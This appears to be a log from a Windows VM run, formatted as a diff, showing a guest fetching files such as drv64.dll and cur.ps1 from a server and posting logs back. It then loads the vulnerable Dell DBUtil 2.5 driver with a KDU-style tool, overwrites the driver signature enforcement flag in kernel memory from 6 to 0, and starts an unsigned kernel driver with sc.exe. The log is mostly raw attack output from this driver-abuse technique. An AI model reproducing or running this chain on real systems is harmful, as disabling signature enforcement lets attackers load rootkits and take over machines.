@@ -1,0 +1,42 @@
+now 21:10:05  vm=VMState="running"
+gets=179
+posts=4
+--- server.log tail ---
+GET drv64.dll ok 2086400
+GET apexdrv.sys ok 10152
+POST /log bytes=3032
+POST /log bytes=3050
+POST /log bytes=699
+GET cur.ps1 ok 9988
+--- guest-k10 tail ---
+  | [+] Environment diagnostics: Hyper-V integration, Hyper-V VSS, Hyper-V shutdown
+  | [+] Drivers database "drv64.dll" loaded at 0x00007FFBFEA60000
+  | [+] Database KDUEXT version is OK
+  | [+] Firmware type (FirmwareTypeUefi)
+  | [+] Provider: "Dell DBUtil 2.5 driver", Name "DBUtilDrv2"
+  | [+] Extracting vulnerable driver as "C:\Users\Public\p37\DBUtilDrv2.sys"
+  | [+] Driver device "DBUtil_2_5" has been opened successfully
+  | [+] Executing post-open callback for given provider
+  | [+] Module "CI.dll" loaded for pattern search
+  | [+] DSE flags (0xFFFFF8030C372004) value: 6, new value to be written: 0
+  | [+] Kernel memory write complete, verifying data
+  | [+] Write result verification succeeded
+  | [+] Vulnerable driver file removed
+  | [+] Return value: 1. Bye-bye!
+  prv 20 WROTE  PRE-DSE=6
+===== POST /log 21:09:40
+## k10
+$ sc.exe start apexdrv
+  exit=0
+  | SERVICE_NAME: apexdrv
+  |         TYPE               : 1  KERNEL_DRIVER
+  |         STATE              : 4  RUNNING
+  |                                 (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+  |         WIN32_EXIT_CODE    : 0  (0x0)
+  |         SERVICE_EXIT_CODE  : 0  (0x0)
+  |         CHECKPOINT         : 0x0
+  |         WAIT_HINT          : 0x0
+  |         PID                : 0
+  |         FLAGS              :
+UNCAUGHT The term 'DrvState' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+-- end --
